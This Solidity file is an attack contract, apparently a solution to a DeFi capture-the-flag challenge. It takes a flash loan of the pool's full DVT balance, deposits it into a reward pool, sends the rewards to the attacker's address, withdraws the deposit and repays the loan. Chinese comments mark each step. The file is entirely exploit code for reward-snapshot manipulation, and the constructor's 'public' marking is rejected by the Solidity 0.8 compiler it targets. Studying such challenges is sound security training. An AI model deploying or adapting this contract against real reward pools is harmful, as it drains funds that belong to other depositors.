// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function rewardToken() external view returns (address);
}

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
}

contract RewarderAttack {
    IFlashLoanPool flashPool;
    IRewarderPool rewardPool;
    IERC20 dvt;
    address attacker;
    
    constructor(address _flashPool, address _rewardPool, address _dvt) public {
        flashPool = IFlashLoanPool(_flashPool);
        rewardPool = IRewarderPool(_rewardPool);
        dvt = IERC20(_dvt);
        attacker = msg.sender;
    }
    
    function attack() external {
        uint256 amount = dvt.balanceOf(address(flashPool));
        flashPool.flashLoan(amount);
    }
    
    function receiveFlashLoan(uint256 amount) external {
        // 存入奖励池
        dvt.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        
        // 取出奖励
        IERC20 reward = IERC20(rewardPool.rewardToken());
        reward.transfer(attacker, reward.balanceOf(address(this)));
        
        // 取出抵押
        rewardPool.withdraw(amount);
        
        // 归还闪电贷
        dvt.transfer(msg.sender, amount);
    }
}
